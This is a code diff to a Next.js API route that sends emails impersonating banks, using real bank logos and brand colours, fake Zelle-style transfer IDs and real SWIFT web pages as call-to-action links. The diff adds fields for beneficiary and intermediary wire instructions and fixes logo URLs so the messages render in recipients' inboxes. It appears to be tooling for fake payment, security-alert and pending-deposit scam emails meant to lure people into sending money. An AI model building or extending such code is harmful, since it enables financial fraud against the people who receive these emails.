@@ -29,6 +29,14 @@ export async function POST(request: Request) {
       template,
       amount,
       message,
+      wireBank,
+      wireSwiftBic,
+      wireRouting,
+      wireInstitution,
+      wireAccount,
+      wireIntermediaryBank,
+      wireCorrespondentSwift,
+      wireClearingAccount,
     } = body as {
       recipientEmail: string
       recipientName: string
@@ -39,6 +47,14 @@ export async function POST(request: Request) {
       template: BankEmailTemplateType
       amount?: string
       message?: string
+      wireBank?: string
+      wireSwiftBic?: string
+      wireRouting?: string
+      wireInstitution?: string
+      wireAccount?: string
+      wireIntermediaryBank?: string
+      wireCorrespondentSwift?: string
+      wireClearingAccount?: string
     }
 
     if (!recipientEmail || !recipientName || !bankId || !bankName || !template) {
@@ -51,20 +67,58 @@ export async function POST(request: Request) {
     }
 
     const bankColor = rawColor || getBankColor(bankId)
-    const amountNum = amount ? parseFloat(amount) : 25
+    const amountNum = amount ? parseFloat(amount.replace(/,/g, "")) : 25
+
+    // Resolve an absolute logo URL safe for email clients.
+    // The client may send a relative path (/chase-logo.jpg) or a localhost URL —
+    // neither is reachable by email clients. Always rebuild from the deployment origin.
+    const deploymentOrigin =
+      process.env.NEXT_PUBLIC_BASE_URL ||
+      (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null)
+
+    function resolveLogoUrl(raw: string | undefined): string | undefined {
+      if (!raw) return undefined
+      // Strip any existing origin (localhost or otherwise) to get the path
+      let path = raw
+      try {
+        const parsed = new URL(raw)
+        path = parsed.pathname
+      } catch {
+        // already a relative path
+      }
+      if (!deploymentOrigin) return undefined
+      return `${deploymentOrigin}${path}`
+    }
+
+    const resolvedLogo = resolveLogoUrl(bankLogo)
     const transferId = `ZEL-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 7).toUpperCase()}`
-    const depositLink = "https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation"
+    // Payment and pending-deposit templates use the SWIFT login page as the CTA destination.
+    // Security-alert and account-verify templates keep the original link.
+    const SWIFT_PAYMENT_LINK = "https://www2.swift.com/swift/login/AccessDenied.html"
+    const SWIFT_DEFAULT_LINK = "https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation"
+    const depositLink =
+      template === "bank-payment" || template === "bank-pending-deposit"
+        ? SWIFT_PAYMENT_LINK
+        : SWIFT_DEFAULT_LINK
 
     const baseData = {
       recipientName,
       bankName,
-      bankLogo,
+      bankLogo: resolvedLogo,
       bankColor,
       depositLink,
       institution: "QuantumYield Treasury",
       message,
       amount: amountNum,
       transferId,
+      wireBank:               wireBank               || undefined,
+      wireSwiftBic:           wireSwiftBic           || undefined,
+      wireRouting:            wireRouting            || undefined,
+      wireInstitution:        wireInstitution        || undefined,
+      wireAccount:            wireAccount            || undefined,
+      wireIntermediaryBank:   wireIntermediaryBank   || undefined,
+      wireCorrespondentSwift: wireCorrespondentSwift || undefined,
+      wireClearingAccount:    wireClearingAccount    || undefined,
     }
 
     let emailHtml: string
@@ -73,7 +127,7 @@ export async function POST(request: Request) {
     switch (template) {
       case "bank-payment":
         emailHtml = generateBankPaymentEmail(baseData)
-        emailSubject = `${TEMPLATE_SUBJECTS["bank-payment"]} — $${amountNum.toFixed(2)}`
+        emailSubject = `${TEMPLATE_SUBJECTS["bank-payment"]} — $${amountNum.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
         break
       case "bank-security-alert":
         emailHtml = generateBankSecurityAlertEmail(baseData)
@@ -85,7 +139,7 @@ export async function POST(request: Request) {
         break
       case "bank-pending-deposit":
         emailHtml = generateBankPendingDepositEmail(baseData)
-        emailSubject = `${TEMPLATE_SUBJECTS["bank-pending-deposit"]} — $${amountNum.toFixed(2)} via ${bankName}`
+        emailSubject = `${TEMPLATE_SUBJECTS["bank-pending-deposit"]} — $${amountNum.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} via ${bankName}`
         break
       default:
         return NextResponse.json({ error: "Unknown template type" }, { status: 400 })
